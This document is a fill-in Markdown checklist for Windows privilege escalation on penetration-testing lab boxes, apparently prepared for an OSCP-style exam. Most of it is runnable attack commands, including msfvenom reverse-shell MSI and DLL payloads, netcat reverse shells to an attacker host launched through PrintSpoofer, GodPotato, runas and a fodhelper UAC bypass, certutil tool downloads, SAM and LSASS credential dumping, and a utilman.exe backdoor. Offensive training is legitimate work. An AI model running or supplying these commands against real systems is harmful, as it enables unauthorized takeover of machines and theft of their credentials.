# Windows Privilege Escalation — `<BOX-NAME>` as `<user>`

> **Part 1** is the always-run core (the high-EV checks that escalate most boxes). **Part 2** is extended checks for when Part 1 didn't yield a path. Cross-reference [Windows-Priv-Esc.md](../Windows-Priv-Esc.md) for technique detail.

---

# PART 1 — CORE (every box)

## 0. Header

| Field | Value |
|---|---|
| Box name |  |
| Foothold user |  |
| OS + build (`systeminfo`) |  |
| Arch (32/64) |  |
| Domain joined? |  |
| Shell type (cmd / PS / WinRM / RDP) |  |

---

## 1. `whoami /priv` — FIRST COMMAND, EVERY TIME

The single highest-value command on the box.

```cmd
whoami
whoami /priv
whoami /groups
whoami /all
```

**`whoami /priv` output:**
```

```

### Privilege checklist — any of these = jackpot

| Privilege | State | Path | Tried |
|---|---|---|---|
| `SeImpersonatePrivilege` |  | Potato (PrintSpoofer / GodPotato) → SYSTEM | [ ] |
| `SeAssignPrimaryTokenPrivilege` |  | Potato → SYSTEM | [ ] |
| `SeBackupPrivilege` |  | Read SAM / SYSTEM / NTDS.dit | [ ] |
| `SeRestorePrivilege` |  | Write any file → replace svc binary | [ ] |
| `SeTakeOwnershipPrivilege` |  | takeown + icacls → replace `utilman.exe` | [ ] |
| `SeDebugPrivilege` |  | Dump LSASS | [ ] |
| `SeLoadDriverPrivilege` |  | Load vulnerable signed driver | [ ] |
| `SeManageVolumePrivilege` |  | Implicit C:\ read | [ ] |
| `SeTcbPrivilege` |  | Act as OS — game over | [ ] |

**`whoami /groups` — integrity level:** `<Low / Medium / High / System>`

### Useful groups beyond Administrators

| Group | Path |
|---|---|
| Backup Operators | SeBackup + SeRestore → dump SAM |
| Hyper-V Administrators | hypervisor → SYSTEM |
| DNSAdmins | `dnscmd` server-level DLL → SYSTEM |
| Server Operators | modify DC services |
| Print Operators | SeLoadDriver |
| Remote Management Users | WinRM access |

**Am I in any?** `<list>`

---

## 2. Host Info

```cmd
hostname
systeminfo
systeminfo > C:\Temp\systeminfo.txt
:: exfil → on Kali: wes.py systeminfo.txt --impact "Elevation of Privilege" -i "Local"
```
**OS line + version (paste for wesng):**
```

```

```cmd
wmic qfe list brief /format:table
```
**Most recent hotfix:** `<date>` — anything past that is open territory.

---

## 3. Users, Groups, Network

```cmd
net user
net localgroup administrators
net accounts
ipconfig /all
netstat -ano | findstr LISTENING
```

**Local Administrators:**
```

```

**Listening ports (loopback-only = pivot/internal targets):**
| Port | Bind | PID | Process | Notes |
|---|---|---|---|---|
|  |  |  |  |  |

---

## 4. winPEAS — Run Once, Read Carefully

```cmd
certutil -urlcache -split -f http://%KALI%/winPEASx64.exe C:\Temp\winPEAS.exe
C:\Temp\winPEAS.exe quiet > C:\Temp\winpeas.out 2>&1
```

### Token / Privileges (confirms §1)
```

```

### Interesting Services (non-Microsoft, weak ACLs, unquoted paths)
```

```

### Interesting Permissions (writable service binaries / configs / dirs)
```

```

### AlwaysInstallElevated check
```

```

### Credentials section (cmdkey, RDP saved, browsers, putty, winscp)
```

```

### Scheduled Tasks (non-Microsoft)
```

```

### Searching files for passwords
```

```

---

## 5. AlwaysInstallElevated — Instant SYSTEM (10-second check)

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
**HKLM:** ``    **HKCU:** ``    **Both = 0x1?** [ ] yes → weaponize:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f msi -o evil.msi
```
```cmd
msiexec /quiet /qn /i C:\Temp\evil.msi
```

---

## 6. Stored Credentials Hunt

### cmdkey / runas saved
```cmd
cmdkey /list
:: runas /savecred /user:DOMAIN\admin "C:\Temp\nc.exe %KALI% 4444 -e cmd.exe"
```
```

```

### PowerShell history (admins paste passwords on the command line)
```cmd
type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>nul
type "C:\Users\<other>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>nul
```
```

```

### Unattended install / autologon
```cmd
dir /s /b C:\unattend.xml C:\unattend.txt C:\sysprep.* C:\Windows\Panther\Unattend.xml C:\Windows\Panther\Unattend\Unattend.xml 2>nul
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword AutoAdminLogon"
```
```

```

### Recursive password grep
```cmd
findstr /si "password" *.xml *.ini *.txt *.config 2>nul
powershell -c "Get-ChildItem C:\ -Include *.txt,*.xml,*.config,*.ini,*.ps1 -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password|passwd|pwd'"
```
```

```

---

## 7. Scheduled Tasks — High-Value Quick Check

```cmd
powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike '\Microsoft*'} | ft TaskName,TaskPath,State"
schtasks /query /fo LIST /v | more
```

**Non-Microsoft tasks running as SYSTEM / Admin:**
| Task | Run as | Action (script/binary) | Writable? |
|---|---|---|---|
|  |  |  | [ ] |

For each:
```cmd
icacls "C:\Path\To\script.ps1"
```

---

## 8. Credentials Collected

| User | Pass / Hash | Source | Tested via |
|---|---|---|---|
|  |  |  | runas [ ] WinRM [ ] RDP [ ] SMB [ ] |

---

## 9. Token Impersonation (if `SeImpersonate` from §1)

Decision tree: **PrintSpoofer** → **GodPotato** → **JuicyPotato** (older boxes only).

```cmd
:: PrintSpoofer (Win 10 1809+ / Server 2019/2022)
C:\Temp\PrintSpoofer.exe -i -c cmd
C:\Temp\PrintSpoofer.exe -c "C:\Temp\nc.exe %KALI% 4444 -e cmd.exe"

:: GodPotato (.NET 3.5+, all modern Windows)
C:\Temp\GodPotato-NET4.exe -cmd "C:\Temp\nc.exe %KALI% 4444 -e cmd.exe"

:: JuicyPotato (≤ Win 10 1803 / Server 2016, needs CLSID)
C:\Temp\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c "{CLSID}"
```
**Tool used:** ``
**Result:**
```

```

---

## 10. Attack Path → SYSTEM / Administrator

**Vector:** `<e.g., whoami /priv shows SeImpersonate → PrintSpoofer → SYSTEM>`

**Commands (for report):**
```cmd

```

**Got SYSTEM at:** `<timestamp>`

**Proof:**
```cmd
whoami
type C:\Users\Administrator\Desktop\proof.txt
```
```

```

---

---

# PART 2 — EXTENDED (if Part 1 didn't yield a path)

> Work through these when stuck. Most boxes never need this section.

---

## A1. Service Misconfigurations

### A1a. Unquoted Service Paths
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
```

```
For each candidate — check write access:
```cmd
icacls "C:\Program Files\Vuln App"
icacls "C:\Program Files"
```
| Service | Path | Writable dir | Restart access? |
|---|---|---|---|
|  |  |  |  |

### A1b. Weak Service Permissions (repoint binPath)
```cmd
certutil -urlcache -split -f http://%KALI%/accesschk.exe C:\Temp\accesschk.exe
C:\Temp\accesschk.exe -uwcqv "Authenticated Users" * /accepteula
C:\Temp\accesschk.exe -uwcqv "Users" *
C:\Temp\accesschk.exe -uwcqv "%USERNAME%" *
```
Look for `SERVICE_CHANGE_CONFIG` / `SERVICE_ALL_ACCESS`. Then:
```cmd
sc config <service> binPath= "C:\Temp\evil.exe"
sc config <service> obj= ".\LocalSystem" password= ""
sc stop <service> & sc start <service>
```

### A1c. Weak Service Binary Permissions
```cmd
sc qc <service>
C:\Temp\accesschk.exe -quvw "C:\Path\To\service.exe"
```
If write → overwrite + restart service.

### A1d. Weak Service Registry Permissions
```cmd
C:\Temp\accesschk.exe -uvwqk HKLM\System\CurrentControlSet\Services\<service>
```
If writable → `reg add ... /v ImagePath /t REG_EXPAND_SZ /d "C:\Temp\evil.exe" /f`

---

## A2. Registry Autoruns

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
```
For each binary: `icacls "C:\Path\To\autorun.exe"` — writable + admin-context login = win.

---

## A3. Startup Folders

```cmd
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

---

## A4. Installed Software — Searchsploit Candidates

```cmd
wmic product get name,version,vendor
dir "C:\Program Files"
dir "C:\Program Files (x86)"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall" /s 2>nul | findstr /i "DisplayName DisplayVersion"
```
**Non-stock software:**
| Software | Version | Searchsploit result |
|---|---|---|
|  |  |  |

---

## A5. App-Specific Credential Stores

```cmd
:: PuTTY
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s
:: WinSCP — %APPDATA%\Roaming\WinSCP.ini  OR  HKCU\Software\Martin Prikryl\WinSCP 2\Sessions
:: FileZilla
type "%APPDATA%\FileZilla\recentservers.xml" 2>nul
type "%APPDATA%\FileZilla\sitemanager.xml" 2>nul
:: VNC
reg query "HKCU\Software\ORL\WinVNC3\Password" 2>nul
reg query "HKCU\Software\TightVNC\Server" 2>nul
:: RDP files
dir /s *.rdp 2>nul
:: IIS app-pool
%windir%\system32\inetsrv\appcmd.exe list apppool /@t:* /text:processModel.password
```

---

## A6. DLL Hijacking

If `whoami /priv` is barren and service ACLs are tight:
```powershell
$env:PATH -split ";"          # writable dirs in PATH = candidate
```
Procmon (offline analysis on Kali) → filter `NAME NOT FOUND` + `.dll` in writable dir.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f dll -o evil.dll
```

---

## A7. UAC Bypass (Medium-IL Admin → High-IL)

Only if `whoami /groups` shows you in `Administrators` BUT integrity is Medium.

```cmd
whoami /groups | findstr -i "Mandatory"
```
**fodhelper bypass:**
```cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\Temp\nc.exe %KALI% 4444 -e cmd.exe" /f
start fodhelper.exe
```

---

## A8. Kernel Exploits — LAST RESORT

Can BSOD the box.
```cmd
type C:\Temp\systeminfo.txt
```
```bash
wes.py systeminfo.txt --impact "Elevation of Privilege" --severity high
```

| CVE / Name | OS match | PoC ready? | Tried |
|---|---|---|---|
|  |  | [ ] | [ ] |

**Recognize these OSCP-era exploits:** MS16-032 (Secondary Logon, very reliable), MS16-135 (Win32k), CVE-2019-1388 (UAC HHCtrl cert), CVE-2021-36934 (HiveNightmare — user-readable SAM), CVE-2021-1675 / 2021-34527 (PrintNightmare).

---

## A9. Privilege Abuse Detail (SeBackup / SeTakeOwnership / SeDebug)

### SeBackupPrivilege → dump SAM
```cmd
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
:: or:
robocopy /b C:\Windows\System32\config\ C:\Temp\ SAM SYSTEM
```
Kali: `impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL`

### SeTakeOwnershipPrivilege → utilman.exe sticky-key
```cmd
takeown /f C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant <user>:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
:: RDP → Win+U on login screen → SYSTEM cmd
```

### SeDebugPrivilege → LSASS dump
```cmd
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
:: Kali: pypykatz lsa minidump lsass.dmp
```

---

## A10. Post-Ex Loot (after SYSTEM)

```cmd
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
:: On DC: also grab NTDS.dit (use ntdsutil or vssadmin)
```

- [ ] SAM + SYSTEM + SECURITY exfiltrated
- [ ] secretsdump output saved
- [ ] LSASS dump (if SeDebug or SYSTEM)
- [ ] proof file screenshot
- [ ] `ipconfig /all` for report
- [ ] On DC: NTDS.dit → domain-wide hashes

**Hashes recovered:**
```

```

---

## A11. Rabbit Holes (for your own learning)

- 
- 
